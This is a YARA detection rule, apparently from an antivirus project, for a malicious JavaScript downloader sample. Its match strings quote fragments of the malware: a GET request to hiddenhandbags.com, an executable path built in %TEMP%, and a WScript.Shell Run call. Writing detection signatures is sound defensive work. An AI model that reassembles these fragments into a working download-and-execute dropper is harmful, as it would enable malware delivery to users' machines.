rule sig_20160329_fb6bb8c90dda7d0dad2c1a207a025ccc {
  meta:
    description = "datamaliciousorder - file 20160329_fb6bb8c90dda7d0dad2c1a207a025ccc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e056fc26df66d1896d6d5038f614b1e72d6b9a6c0ed46c30134c2a488b1c3ff5"

  strings:
    $s1  = "p0[jZ](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function e() {return oH[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8zwThVNasy6MKLt.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[tE](p() * 11); if (p0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var oH = function u() {return WScript[C](\"WScript.Shell\");}(), vc = 11;" fullword ascii
    $s5  = "function q(r0, KF){R = R * 1; return r0 - KF;};" fullword ascii
    $s6  = "function B(){return \"\" + T0;};" fullword ascii
    $s7  = "function r() {return ((j == true) && (j == KT)) ? 1 : R;};" fullword ascii
    $s8  = "function Xs(eG){oH[\"Run\"](eG, R, R);};" fullword ascii
    $s9  = "function p(){return 22;};" fullword ascii
    $s10 = "function c()" fullword ascii
    $s11 = "return q(U, lM);" fullword ascii
    $s12 = "function mf(){return C;};" fullword ascii
    $s13 = "var G = new this[\"Date\"]();" fullword ascii
    $s14 = " while (s){" fullword ascii
    $s15 = "function T(Cw) {var Qi = (1, 2, 3, 4, 5, Cw); return Qi;};" fullword ascii
    $s16 = "var j = false;" fullword ascii
    $s17 = "j = true; " fullword ascii
    $s18 = "var iV = false;" fullword ascii
    $s19 = "var KT = false;" fullword ascii
    $s20 = "KT = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}